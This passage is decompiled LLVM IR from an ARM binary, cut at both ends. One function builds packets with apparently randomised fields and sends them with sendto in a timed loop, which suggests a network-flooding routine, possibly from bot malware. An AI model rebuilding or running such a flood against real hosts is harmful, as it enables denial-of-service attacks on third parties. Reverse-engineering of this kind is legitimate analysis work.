  store i8 %v1_c038, i8* %v4_c038, align 1
  %v0_c03c = load i32, i32* @r8, align 4
  %v1_c03c = trunc i32 %v0_c03c to i8
  %v2_c03c = load i32, i32* @r5, align 4
  %v3_c03c = add i32 %v2_c03c, 11
  %v4_c03c = inttoptr i32 %v3_c03c to i8*
  store i8 %v1_c03c, i8* %v4_c03c, align 1
  %v0_c040 = load i32, i32* @r5, align 4
  store i32 %v0_c040, i32* @r0, align 4
  %v2_c044 = call i32 @function_f188(i32 %v0_c040, i32 20)
  %v3_c044 = trunc i32 %v2_c044 to i8
  %v4_c048 = sdiv i32 %v2_c044, 256
  store i32 %v4_c048, i32* %r3.global-to-local, align 4
  %v1_c04c = trunc i32 %v4_c048 to i8
  %v2_c04c = load i32, i32* @r5, align 4
  %v3_c04c = add i32 %v2_c04c, 11
  %v4_c04c = inttoptr i32 %v3_c04c to i8*
  store i8 %v1_c04c, i8* %v4_c04c, align 1
  %v3_c050 = load i32, i32* @r5, align 4
  %v4_c050 = add i32 %v3_c050, 10
  %v5_c050 = inttoptr i32 %v4_c050 to i8*
  store i8 %v3_c044, i8* %v5_c050, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c058 = load i32, i32* @r8, align 4
  %v1_c058 = trunc i32 %v0_c058 to i8
  %v2_c058 = load i32, i32* @r6, align 4
  %v3_c058 = add i32 %v2_c058, 10
  %v4_c058 = inttoptr i32 %v3_c058 to i8*
  store i8 %v1_c058, i8* %v4_c058, align 1
  %v0_c05c = load i32, i32* @r8, align 4
  %v1_c05c = trunc i32 %v0_c05c to i8
  %v2_c05c = load i32, i32* @r6, align 4
  %v3_c05c = add i32 %v2_c05c, 11
  %v4_c05c = inttoptr i32 %v3_c05c to i8*
  store i8 %v1_c05c, i8* %v4_c05c, align 1
  %v0_c060 = load i32, i32* @r6, align 4
  store i32 %v0_c060, i32* @r0, align 4
  %v2_c064 = call i32 @function_f188(i32 %v0_c060, i32 20)
  %v3_c064 = trunc i32 %v2_c064 to i8
  store i32 %v2_c064, i32* %r0.global-to-local, align 4
  %v4_c068 = sdiv i32 %v2_c064, 256
  store i32 %v4_c068, i32* %r3.global-to-local, align 4
  %v3_c06c = load i32, i32* @r6, align 4
  %v4_c06c = add i32 %v3_c06c, 10
  %v5_c06c = inttoptr i32 %v4_c06c to i8*
  store i8 %v3_c064, i8* %v5_c06c, align 1
  %v0_c070 = load i32, i32* %r3.global-to-local, align 4
  %v1_c070 = trunc i32 %v0_c070 to i8
  %v2_c070 = load i32, i32* @r6, align 4
  %v3_c070 = add i32 %v2_c070, 11
  %v4_c070 = inttoptr i32 %v3_c070 to i8*
  store i8 %v1_c070, i8* %v4_c070, align 1
  %v0_c074 = load i32, i32* @r7, align 4
  %v1_c074 = add i32 %v0_c074, 4
  %v2_c074 = inttoptr i32 %v1_c074 to i8*
  %v3_c074 = load i8, i8* %v2_c074, align 1
  %v4_c074 = zext i8 %v3_c074 to i32
  store i32 %v4_c074, i32* %r3.global-to-local, align 4
  %v1_c078 = add i32 %v0_c074, 5
  %v2_c078 = inttoptr i32 %v1_c078 to i8*
  %v3_c078 = load i8, i8* %v2_c078, align 1
  %v4_c078 = zext i8 %v3_c078 to i32
  store i32 %v0_c074, i32* @r1, align 4
  %v4_c080 = mul nuw nsw i32 %v4_c078, 256
  %v5_c080 = or i32 %v4_c080, %v4_c074
  store i32 %v5_c080, i32* %r2.global-to-local, align 4
  %v0_c084 = load i32, i32* @r8, align 4
  %v1_c084 = trunc i32 %v0_c084 to i8
  %v3_c084 = add i32 %v0_c074, 6
  %v4_c084 = inttoptr i32 %v3_c084 to i8*
  store i8 %v1_c084, i8* %v4_c084, align 1
  %v0_c088 = load i32, i32* @fp, align 4
  store i32 %v0_c088, i32* %r3.global-to-local, align 4
  %v0_c08c = load i32, i32* @r8, align 4
  %v1_c08c = trunc i32 %v0_c08c to i8
  %v2_c08c = load i32, i32* @r7, align 4
  %v3_c08c = add i32 %v2_c08c, 7
  %v4_c08c = inttoptr i32 %v3_c08c to i8*
  store i8 %v1_c08c, i8* %v4_c08c, align 1
  %v0_c090 = load i32, i32* @r6, align 4
  store i32 %v0_c090, i32* %r0.global-to-local, align 4
  %v4_c094 = call i32 @function_f1e4(i32 %v0_c090, i32 %v0_c074, i32 %v5_c080, i32 %v0_c088)
  %v5_c094 = trunc i32 %v4_c094 to i8
  store i32 %v4_c094, i32* %r0.global-to-local, align 4
  %v3_c098 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c098, i32* %r3.global-to-local, align 4
  %v3_c09c = mul i32 %v3_c098, 32
  store i32 %v3_c09c, i32* %r2.global-to-local, align 4
  %v0_c0a0 = load i32, i32* @r5, align 4
  %v1_c0a0 = add i32 %v0_c0a0, 16
  %v2_c0a0 = inttoptr i32 %v1_c0a0 to i32*
  %v3_c0a0 = load i32, i32* %v2_c0a0, align 4
  store i32 %v3_c0a0, i32* %r1.global-to-local, align 4
  %v5_c0a4 = mul i32 %v3_c098, 24
  store i32 %v5_c0a4, i32* %r2.global-to-local, align 4
  %v4_c0a836 = udiv i32 %v4_c094, 256
  %v1_c0ac = trunc i32 %v4_c0a836 to i8
  %v2_c0ac = load i32, i32* @r7, align 4
  %v3_c0ac = add i32 %v2_c0ac, 7
  %v4_c0ac = inttoptr i32 %v3_c0ac to i8*
  store i8 %v1_c0ac, i8* %v4_c0ac, align 1
  %v0_c0b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0b0 = load i32, i32* @sb, align 4
  %v2_c0b0 = add i32 %v1_c0b0, %v0_c0b0
  store i32 %v2_c0b0, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_c0b8 = load i32, i32* @r7, align 4
  %v4_c0b8 = add i32 %v3_c0b8, 6
  %v5_c0b8 = inttoptr i32 %v4_c0b8 to i8*
  store i8 %v5_c094, i8* %v5_c0b8, align 1
  %v0_c0bc = load i32, i32* %r1.global-to-local, align 4
  %v1_c0bc = load i32, i32* %lr.global-to-local, align 4
  %v2_c0bc = add i32 %v1_c0bc, 4
  %v3_c0bc = inttoptr i32 %v2_c0bc to i32*
  store i32 %v0_c0bc, i32* %v3_c0bc, align 4
  %v0_c0c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c0c0 = trunc i32 %v0_c0c0 to i8
  %v2_c0c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_c0c0 = load i32, i32* @sb, align 4
  %v4_c0c0 = add i32 %v3_c0c0, %v2_c0c0
  %v5_c0c0 = inttoptr i32 %v4_c0c0 to i8*
  store i8 %v1_c0c0, i8* %v5_c0c0, align 1
  %v0_c0c4 = load i32, i32* @r8, align 4
  %v1_c0c4 = trunc i32 %v0_c0c4 to i8
  %v2_c0c4 = load i32, i32* %lr.global-to-local, align 4
  %v3_c0c4 = add i32 %v2_c0c4, 2
  %v4_c0c4 = inttoptr i32 %v3_c0c4 to i8*
  store i8 %v1_c0c4, i8* %v4_c0c4, align 1
  %v0_c0c8 = load i32, i32* @r8, align 4
  %v1_c0c8 = trunc i32 %v0_c0c8 to i8
  %v2_c0c8 = load i32, i32* %lr.global-to-local, align 4
  %v3_c0c8 = add i32 %v2_c0c8, 1
  %v4_c0c8 = inttoptr i32 %v3_c0c8 to i8*
  store i8 %v1_c0c8, i8* %v4_c0c8, align 1
  %v0_c0cc = load i32, i32* @r8, align 4
  %v1_c0cc = trunc i32 %v0_c0cc to i8
  %v2_c0cc = load i32, i32* %lr.global-to-local, align 4
  %v3_c0cc = add i32 %v2_c0cc, 3
  %v4_c0cc = inttoptr i32 %v3_c0cc to i8*
  store i8 %v1_c0cc, i8* %v4_c0cc, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c0d8 = load i32, i32* @r5, align 4
  store i32 %v0_c0d8, i32* %r1.global-to-local, align 4
  store i32 %v3_bcc4, i32* %r0.global-to-local, align 4
  %v0_c0e0 = load i32, i32* @sl, align 4
  store i32 %v0_c0e0, i32* %r2.global-to-local, align 4
  %v0_c0e4 = load i32, i32* %lr.global-to-local, align 4
  %v4_c0e4 = inttoptr i32 %v0_c0e4 to %sockaddr*
  %v7_c0ec = inttoptr i32 %v0_c0d8 to i32*
  %v9_c0ec = call i32 @sendto(i32 %v3_bcc4, i32* %v7_c0ec, i32 %v0_c0e0, i32 16384, %sockaddr* %v4_c0e4, i32 16)
  %v3_c0f0 = load i32, i32* %stack_var_-40, align 4
  %v1_c0f4 = add i32 %v3_c0f0, 1
  store i32 %v1_c0f4, i32* %r0.global-to-local, align 4
  store i32 %v1_bb54, i32* %r3.global-to-local, align 4
  %v9_c0fc = icmp eq i32 %v1_c0f4, %v1_bb54
  store i1 %v9_c0fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c0f4, i32* %stack_var_-40, align 4
  %v6_c104 = icmp slt i32 %v1_c0f4, %v1_bb54
  br i1 %v6_c104, label %dec_label_pc_c108, label %dec_label_pc_c25c

dec_label_pc_c108:                                ; preds = %dec_label_pc_c034, %dec_label_pc_bfc4
  %v1_c11c = phi i32 [ %v1_c0f4, %dec_label_pc_c034 ], [ 0, %dec_label_pc_bfc4 ]
  %v5_c10c = mul i32 %v1_c11c, 24
  %v1_c110 = load i32, i32* @sb, align 4
  %v2_c110 = add i32 %v1_c110, %v5_c10c
  store i32 %v2_c110, i32* %r3.global-to-local, align 4
  store i32 %v4_bb80, i32* %r1.global-to-local, align 4
  %v1_c118 = add i32 %v2_c110, 20
  %v2_c118 = inttoptr i32 %v1_c118 to i8*
  %v3_c118 = load i8, i8* %v2_c118, align 1
  %v4_c118 = zext i8 %v3_c118 to i32
  store i32 %v4_c118, i32* %r2.global-to-local, align 4
  %v4_c11c = mul i32 %v1_c11c, 4
  %v5_c11c = add i32 %v4_c11c, %v4_bb80
  %v6_c11c = inttoptr i32 %v5_c11c to i32*
  %v7_c11c = load i32, i32* %v6_c11c, align 4
  store i32 %v7_c11c, i32* @r5, align 4
  %v2_c120 = icmp ugt i8 %v3_c118, 30
  %v7_c120 = icmp eq i8 %v3_c118, 31
  store i1 %v7_c120, i1* %cpsr_z.global-to-local, align 1
  %v1_c124 = add i32 %v7_c11c, 24
  store i32 %v1_c124, i32* @r6, align 4
  %v1_c128 = add i32 %v7_c11c, 44
  store i32 %v1_c128, i32* @r7, align 4
  %v2_c12c = xor i1 %v7_c120, true
  %v3_c12c = and i1 %v2_c120, %v2_c12c
  br i1 %v3_c12c, label %dec_label_pc_bfdc, label %dec_label_pc_c130

dec_label_pc_c130:                                ; preds = %dec_label_pc_c108
  %v1_c130 = add i32 %v2_c110, 16
  %v2_c130 = inttoptr i32 %v1_c130 to i32*
  %v3_c130 = load i32, i32* %v2_c130, align 4
  store i32 %v3_c130, i32* %r4.global-to-local, align 4
  %v0_c134 = call i32 @function_105b0()
  store i32 %v0_c134, i32* %r0.global-to-local, align 4
  %v3_c138 = load i32, i32* %stack_var_-40, align 4
  %v5_c140 = mul i32 %v3_c138, 24
  %v0_c144 = load i32, i32* %r4.global-to-local, align 4
  %v1_c148 = load i32, i32* @sb, align 4
  %v2_c148 = add i32 %v1_c148, %v5_c140
  store i32 %v2_c148, i32* %r1.global-to-local, align 4
  %v1_c14c = and i32 %v0_c144, 65280
  store i32 %v1_c14c, i32* %r3.global-to-local, align 4
  %v1_c144 = udiv i32 %v0_c144, 256
  %v3_c150 = and i32 %v1_c144, 65280
  store i32 %v3_c150, i32* %r2.global-to-local, align 4
  %v1_c158 = add i32 %v2_c148, 20
  %v2_c158 = inttoptr i32 %v1_c158 to i8*
  %v3_c158 = load i8, i8* %v2_c158, align 1
  %v4_c158 = zext i8 %v3_c158 to i32
  store i32 %v4_c158, i32* %lr.global-to-local, align 4
  %v2_c164 = call i32 @llvm.bswap.i32(i32 %v0_c144)
  %v7_c168 = lshr i32 %v0_c134, %v4_c158
  %v8_c168 = add i32 %v7_c168, %v2_c164
  %v3_c174 = mul i32 %v8_c168, 16777216
  %v1_c178 = and i32 %v8_c168, 65280
  store i32 %v1_c178, i32* %r0.global-to-local, align 4
  store i32 %v5_bca0, i32* %r2.global-to-local, align 4
  %v4_c184 = mul nuw nsw i32 %v1_c178, 256
  %v5_c184 = or i32 %v4_c184, %v3_c174
  store i32 %v5_c184, i32* %r1.global-to-local, align 4
  %v2_c188 = call i32 @llvm.bswap.i32(i32 %v8_c168)
  store i32 %v2_c188, i32* %r3.global-to-local, align 4
  store i1 %v7_bfe0, i1* %cpsr_z.global-to-local, align 1
  %v1_c190 = load i32, i32* @r5, align 4
  %v2_c190 = add i32 %v1_c190, 16
  %v3_c190 = inttoptr i32 %v2_c190 to i32*
  store i32 %v2_c188, i32* %v3_c190, align 4
  br i1 %v2_bfe0, label %dec_label_pc_c198, label %dec_label_pc_bfe8

dec_label_pc_c198:                                ; preds = %dec_label_pc_c130, %dec_label_pc_bfdc
  %v0_c198 = call i32 @function_105b0()
  store i32 %v0_c198, i32* %r0.global-to-local, align 4
  store i32 %v3_bd1c, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_c1a8, i1* %cpsr_z.global-to-local, align 1
  %v1_c1ac = load i32, i32* @r5, align 4
  %v2_c1ac = add i32 %v1_c1ac, 12
  %v3_c1ac = inttoptr i32 %v2_c1ac to i32*
  store i32 %v0_c198, i32* %v3_c1ac, align 4
  br i1 %v9_c1a8, label %dec_label_pc_c1b4, label %dec_label_pc_c198.dec_label_pc_bffc_crit_edge

dec_label_pc_c198.dec_label_pc_bffc_crit_edge:    ; preds = %dec_label_pc_c198
  %v1_c000.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bffc

dec_label_pc_c1b4:                                ; preds = %dec_label_pc_c198, %dec_label_pc_bfe8
  %v0_c1b4 = call i32 @function_105b0()
  %v3_c1bc = urem i32 %v0_c1b4, 65536
  store i32 %v3_c1bc, i32* %r0.global-to-local, align 4
  %v1_c1c4 = sub nsw i32 999, %v3_c1bc
  store i32 %v1_c1c4, i32* %r2.global-to-local, align 4
  %v3_c1c8 = sdiv i32 %v1_c1c4, 256
  store i32 %v3_c1c8, i32* %r1.global-to-local, align 4
  %v3_c1cc35 = udiv i32 %v3_c1bc, 256
  store i32 %v3_c1cc35, i32* %r3.global-to-local, align 4
  %v1_c1d0 = trunc i32 %v3_c1cc35 to i8
  %v2_c1d0 = load i32, i32* @r5, align 4
  %v3_c1d0 = add i32 %v2_c1d0, 5
  %v4_c1d0 = inttoptr i32 %v3_c1d0 to i8*
  store i8 %v1_c1d0, i8* %v4_c1d0, align 1
  %v0_c1d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_c1d4 = trunc i32 %v0_c1d4 to i8
  %v2_c1d4 = load i32, i32* @r5, align 4
  %v3_c1d4 = add i32 %v2_c1d4, 4
  %v4_c1d4 = inttoptr i32 %v3_c1d4 to i8*
  store i8 %v1_c1d4, i8* %v4_c1d4, align 1
  %v0_c1d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c1d8 = trunc i32 %v0_c1d8 to i8
  %v2_c1d8 = load i32, i32* @r6, align 4
  %v3_c1d8 = add i32 %v2_c1d8, 5
  %v4_c1d8 = inttoptr i32 %v3_c1d8 to i8*
  store i8 %v1_c1d8, i8* %v4_c1d8, align 1
  store i32 %v3_bd20, i32* %r1.global-to-local, align 4
  %v1_c1e0 = load i32, i32* @r4, align 4
  %v9_c1e0 = icmp eq i32 %v3_bd20, %v1_c1e0
  store i1 %v9_c1e0, i1* %cpsr_z.global-to-local, align 1
  %v0_c1e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c1e4 = trunc i32 %v0_c1e4 to i8
  %v2_c1e4 = load i32, i32* @r6, align 4
  %v3_c1e4 = add i32 %v2_c1e4, 4
  %v4_c1e4 = inttoptr i32 %v3_c1e4 to i8*
  store i8 %v1_c1e4, i8* %v4_c1e4, align 1
  %v0_c1e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c1e8, label %dec_label_pc_c1ec, label %dec_label_pc_c1b4.dec_label_pc_c008_crit_edge

dec_label_pc_c1b4.dec_label_pc_c008_crit_edge:    ; preds = %dec_label_pc_c1b4
  %v1_c00c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c008

dec_label_pc_c1ec:                                ; preds = %dec_label_pc_c1b4, %dec_label_pc_bffc
  %v0_c1ec = call i32 @function_105b0()
  %v1_c1ec = trunc i32 %v0_c1ec to i8
  store i32 %v0_c1ec, i32* %r0.global-to-local, align 4
  store i32 %v3_bd24, i32* %r2.global-to-local, align 4
  %v4_c1f4 = sdiv i32 %v0_c1ec, 256
  store i32 %v4_c1f4, i32* %r3.global-to-local, align 4
  %v1_c1f8 = load i32, i32* @r4, align 4
  %v9_c1f8 = icmp eq i32 %v3_bd24, %v1_c1f8
  store i1 %v9_c1f8, i1* %cpsr_z.global-to-local, align 1
  %v3_c1fc = load i32, i32* @r5, align 4
  %v4_c1fc = add i32 %v3_c1fc, 44
  %v5_c1fc = inttoptr i32 %v4_c1fc to i8*
  store i8 %v1_c1ec, i8* %v5_c1fc, align 1
  %v0_c200 = load i32, i32* %r3.global-to-local, align 4
  %v1_c200 = trunc i32 %v0_c200 to i8
  %v2_c200 = load i32, i32* @r7, align 4
  %v3_c200 = add i32 %v2_c200, 1
  %v4_c200 = inttoptr i32 %v3_c200 to i8*
  store i8 %v1_c200, i8* %v4_c200, align 1
  %v0_c204 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c204, label %dec_label_pc_c208, label %dec_label_pc_c014

dec_label_pc_c208:                                ; preds = %dec_label_pc_c1ec, %dec_label_pc_c008
  %v0_c208 = call i32 @function_105b0()
  %v1_c208 = trunc i32 %v0_c208 to i8
  store i32 %v0_c208, i32* %r0.global-to-local, align 4
  %v4_c20c37 = udiv i32 %v0_c208, 256
  %v1_c210 = trunc i32 %v4_c20c37 to i8
  %v2_c210 = load i32, i32* @r7, align 4
  %v3_c210 = add i32 %v2_c210, 3
  %v4_c210 = inttoptr i32 %v3_c210 to i8*
  store i8 %v1_c210, i8* %v4_c210, align 1
  store i32 %v1_bd18, i32* %r3.global-to-local, align 4
  store i1 %v2_c218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c218, label %bb97, label %bb96

bb96:                                             ; preds = %dec_label_pc_c208
  %v1_c21c = load i32, i32* @r5, align 4
  %v2_c21c = add i32 %v1_c21c, 16
  %v3_c21c = inttoptr i32 %v2_c21c to i32*
  %v4_c21c = load i32, i32* %v3_c21c, align 4
  store i32 %v4_c21c, i32* %r3.global-to-local, align 4
  br label %bb97

bb97:                                             ; preds = %dec_label_pc_c208, %bb96
  %v3_c220 = load i32, i32* @r7, align 4
  %v4_c220 = add i32 %v3_c220, 2
  %v5_c220 = inttoptr i32 %v4_c220 to i8*
  store i8 %v1_c208, i8* %v5_c220, align 1
  %v0_c224 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c224, label %dec_label_pc_c22c, label %bb98

bb98:                                             ; preds = %bb97
  %v1_c224 = load i32, i32* %r3.global-to-local, align 4
  %v2_c224 = load i32, i32* @r6, align 4
  %v3_c224 = add i32 %v2_c224, 16
  %v4_c224 = inttoptr i32 %v3_c224 to i32*
  store i32 %v1_c224, i32* %v4_c224, align 4
  br label %dec_label_pc_c028

dec_label_pc_c22c:                                ; preds = %dec_label_pc_c014, %bb97
  %v0_c22c = call i32 @function_105b0()
  store i32 %v0_c22c, i32* %r0.global-to-local, align 4
  store i32 %v1_bc6c, i32* %r1.global-to-local, align 4
  store i1 %v2_c234, i1* %cpsr_z.global-to-local, align 1
  %v1_c238 = load i32, i32* @r6, align 4
  %v2_c238 = add i32 %v1_c238, 16
  %v3_c238 = inttoptr i32 %v2_c238 to i32*
  store i32 %v0_c22c, i32* %v3_c238, align 4
  br i1 %v2_c234, label %dec_label_pc_c034, label %dec_label_pc_c240

dec_label_pc_c240:                                ; preds = %dec_label_pc_c028, %dec_label_pc_c22c
  %v0_c240 = load i32, i32* @r7, align 4
  %v1_c240 = add i32 %v0_c240, 8
  store i32 %v1_c240, i32* @r4, align 4
  store i32 %v1_c240, i32* %r0.global-to-local, align 4
  store i32 %v5_bc4c, i32* %r1.global-to-local, align 4
  %v2_c24c = call i32 @function_10664(i32 %v1_c240, i32 %v5_bc4c)
  store i32 %v2_c24c, i32* %r0.global-to-local, align 4
  store i32 %v5_bc4c, i32* %r2.global-to-local, align 4
  %v0_c254 = load i32, i32* @r8, align 4
  %v1_c254 = trunc i32 %v0_c254 to i8
  %v2_c254 = load i32, i32* @r4, align 4
  %v4_c254 = add i32 %v2_c254, %v5_bc4c
  %v5_c254 = inttoptr i32 %v4_c254 to i8*
  store i8 %v1_c254, i8* %v5_c254, align 1
  br label %dec_label_pc_c034

dec_label_pc_c25c:                                ; preds = %dec_label_pc_c034, %dec_label_pc_bfb0
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c260 = call i32 @time(i32* null)
  store i32 %v2_c260, i32* %r0.global-to-local, align 4
  store i32 %v2_bcb0, i32* %r1.global-to-local, align 4
  %v9_c268 = icmp eq i32 %v2_bcb0, %v2_c260
  store i1 %v9_c268, i1* %cpsr_z.global-to-local, align 1
  %v6_c26c = icmp slt i32 %v2_bcb0, %v2_c260
  br i1 %v6_c26c, label %dec_label_pc_c270, label %dec_label_pc_bfb0

dec_label_pc_c270:                                ; preds = %dec_label_pc_c25c, %dec_label_pc_bb50, %dec_label_pc_c278
  %v29_c274 = phi i32 [ %v3_bcc4, %dec_label_pc_bb50 ], [ %v1_c27c, %dec_label_pc_c278 ], [ %v2_c260, %dec_label_pc_c25c ]
  store i32 %v3_bb50, i32* %r4.global-to-local, align 4
  store i32 %v6_bb50, i32* %r5.global-to-local, align 4
  store i32 %v9_bb50, i32* %r6.global-to-local, align 4
  store i32 %v12_bb50, i32* %r7.global-to-local, align 4
  store i32 %v15_bb50, i32* %r8.global-to-local, align 4
  store i32 %v21_bb50, i32* %sl.global-to-local, align 4
  store i32 %v24_bb50, i32* %fp.global-to-local, align 4
  ret i32 %v29_c274

dec_label_pc_c278:                                ; preds = %dec_label_pc_bcd4
  store i32 %v3_bcc4, i32* %r0.global-to-local, align 4
  %v1_c27c = call i32 @close(i32 %v3_bcc4)
  store i32 %v1_c27c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c270

; uselistorder directives
  uselistorder i32 %v1_c27c, { 1, 0 }
  uselistorder i32 %v0_c208, { 0, 2, 1 }
  uselistorder i32 %v0_c1ec, { 0, 2, 1 }
  uselistorder i32 %v3_c1bc, { 0, 2, 1 }
  uselistorder i32 %v2_c188, { 1, 0 }
  uselistorder i32 %v8_c168, { 1, 2, 0 }
  uselistorder i32 %v0_c144, { 1, 0, 2 }
  uselistorder i32 %v7_c11c, { 1, 0, 2 }
  uselistorder i32 %v1_c0f4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_c098, { 1, 0, 2 }
  uselistorder i32 %v4_c094, { 0, 2, 1 }
  uselistorder i32 %v0_c074, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_c064, { 0, 2, 1 }
  uselistorder i32 %v4_c048, { 1, 0 }
  uselistorder i1 %v2_c234, { 2, 3, 1, 0 }
  uselistorder i1 %v2_c218, { 2, 3, 1, 0 }
  uselistorder i1 %v9_c1a8, { 2, 3, 1, 0 }
  uselistorder i1 %v7_bfe0, { 2, 1, 0 }
  uselistorder i32 %v0_bf50, { 1, 0, 2 }
  uselistorder i32 %v3_bdf4, { 1, 0 }
  uselistorder i32 %tmp82, { 1, 0, 2 }
  uselistorder i32 %v1_bd70, { 0, 2, 1 }
  uselistorder i32 %v1_bd68, { 2, 1, 0 }
  uselistorder i32 %v1_bd64, { 1, 0 }
  uselistorder i32 %v1_bd60, { 1, 0 }
  uselistorder i32 %v1_bd54, { 1, 0 }
  uselistorder i32 %v3_bd4c, { 2, 0, 1 }
  uselistorder i32 %v3_bd1c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_bd18, { 4, 3, 5, 1, 2, 0 }
  uselistorder i1 %v2_bd14, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bd0c, { 0, 3, 2, 1 }
  uselistorder i32 %v0_bd08, { 0, 1, 3, 2 }
  uselistorder i1 %v7_bcf4, { 1, 0 }
  uselistorder i1 %v7_bcc8, { 1, 0 }
  uselistorder i32 %v3_bcc4, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_bcb0, { 2, 1, 0 }
  uselistorder i32 %v5_bca0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_bc6c, { 1, 0, 2 }
  uselistorder i32 %v5_bc4c, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i8 %v5_bbf0, { 1, 0 }
  uselistorder i32 %v4_bb80, { 0, 3, 1, 2 }
  uselistorder i32 %v1_bb54, { 1, 2, 3, 0, 4, 5, 6, 9, 7, 8 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 13, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 23, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 15, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 16, 9, 10, 11, 12, 14, 13, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 41, 42, 44, 43, 46, 45, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 7, 10, 11, 8, 9, 13, 12, 15, 14, 16, 18, 17, 19, 20, 25, 21, 22, 23, 24, 28, 26, 27, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 17, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder label %dec_label_pc_c270, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c240, { 1, 0 }
  uselistorder label %dec_label_pc_c22c, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %dec_label_pc_c034, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bfb0, { 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c288(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_c288:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i8 @__decompiler_undefined_function_1()
  %tmp37 = call i8 @__decompiler_undefined_function_1()
  %tmp38 = call i8 @__decompiler_undefined_function_1()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_c288 = load i32, i32* @r4, align 4
  %v18_c288 = load i32, i32* @sb, align 4
  %v1_c28c = urem i32 %arg2, 256
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %v1_c28c, i32* %r0.global-to-local, align 4
  %v1_c2a8 = urem i32 %arg4, 256
  store i32 %v1_c2a8, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v2_c2b8 = call i32* @calloc(i32 %v1_c28c, i32 16)
  %v4_c2b8 = ptrtoint i32* %v2_c2b8 to i32
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v1_c28c, i32* %r0.global-to-local, align 4
  %v2_c2c8 = call i32* @calloc(i32 %v1_c28c, i32 4)
